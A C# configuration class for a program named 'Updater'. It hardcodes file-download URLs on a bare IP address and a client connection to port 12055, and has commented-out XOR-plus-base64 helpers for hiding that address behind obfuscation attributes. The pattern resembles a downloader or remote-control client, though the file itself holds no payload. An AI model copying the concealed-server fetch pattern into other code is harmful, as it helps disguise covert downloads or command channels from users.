using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;

namespace Updater
{
    public class Config
    {
        public static bool dev = false;
        public static int type = 0;


        public static string[] weburl = new string[2] { "http://94.130.219.211/file_kr", "http://94.130.219.211/file_kr" };
        private static string ip = "";// Config.Base64DecodeEx("5ejy7e/s8u7t5fLu7e0="/*94.130.219.211*/, 220);
        public static string[] newpath = new string[2] { "", "\\KR" };
        private static int port = 12055;
        public static int serverType = 0;
        public static ClientData connect = new ClientData(ip, port);
        public static string UTMD5 = HelperFile.stringMD5(string.Format("{0}{1}{2}", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), Environment.TickCount, new Random().Next(1, 100000)));


        public static string _urlNocacheUrl()
        {
            return "?r=" + UTMD5;
        }

        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        //[Obfuscation(Feature = "virtualization", Exclude = false)]
        //public static string Base64EncodeEx(string plainText, byte xor)
        //{
        //    var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
        //    for (int i = 0; i < plainTextBytes.Length; i++)
        //    {
        //        plainTextBytes[i] = (byte)(plainTextBytes[i] ^ xor);
        //    }
        //    return System.Convert.ToBase64String(plainTextBytes);
        //}

        //[
        //(Feature = "virtualization", Exclude = false)]
        //public static string Base64DecodeEx(string base64EncodedData, byte xor)
        //{
        //    var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
        //    for (int i = 0; i < base64EncodedBytes.Length; i++)
        //    {
        //        base64EncodedBytes[i] = (byte)(base64EncodedBytes[i] ^ xor);
        //    }
        //    return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        //}
    }
}
